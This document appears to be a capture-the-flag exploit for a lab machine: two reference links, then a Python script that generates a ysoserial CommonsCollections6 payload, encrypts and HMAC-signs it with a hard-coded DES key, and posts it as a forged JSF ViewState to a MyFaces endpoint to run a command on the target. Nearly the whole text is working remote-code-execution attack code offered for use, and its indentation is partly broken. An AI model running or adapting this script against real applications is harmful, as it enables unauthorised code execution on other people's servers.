Readme:
1) https://myfaces.apache.org/core20/myfaces-impl/webconfig.html
2) https://cryptosys.net/pki/manpki/pki_paddingschemes.html

Payload:

```
import os
import re
import base64
import urllib
from Crypto.Cipher import DES
from Crypto.Hash import SHA, HMAC
import hashlib
import requests

_key = b"SnNGOTg3Ni0="
key = base64.b64decode(_key)

cipher = DES.new(key, DES.MODE_ECB)

# For test payloads
#payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
#            'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
#            'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
#            'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']

# War payload
payloads = ['CommonsCollections6']

def pad(s):
    return s + (DES.block_size - len(s) % DES.block_size) * \
        chr(DES.block_size - len(s) % DES.block_size)

def generate(name, cmd):
    for payload in payloads:
        final = cmd.replace('REPLACE', payload)
        print ('Generating ' + payload + ' for ' + name + '...')
        command = os.popen('java -jar ./ysoserial.jar ' + payload + ' "' + final + '"')
        result = command.read()
        command.close()
	
	      padded_text = pad(result)
        crypted_payload = cipher.encrypt(padded_text)
        signed_payload = HMAC.new(key, crypted_payload, SHA)
        
        print (len(signed_payload.digest()))
        print (signed_payload.digest())
	
        payload = crypted_payload+signed_payload.digest()
        payload_result = base64.b64encode(payload)
        print (payload_result)
        
        if payload_result != "":
            data = {
              'j_id_jsp_1623871077_1_SUBMIT': '1',
              'j_id_jsp_1623871077_1:email': 'freenetwork_pwnd@mail.com',
              'j_id_jsp_1623871077_1:submit': 'SIGN+UP',
              'javax.faces.ViewState': '{}'.format(payload_result)
            }
            r = requests.post('http://10.10.10.130:8080/userSubscribe.faces', data=data)

generate('Windows', 'ping -n 1 10.10.12.43')
```
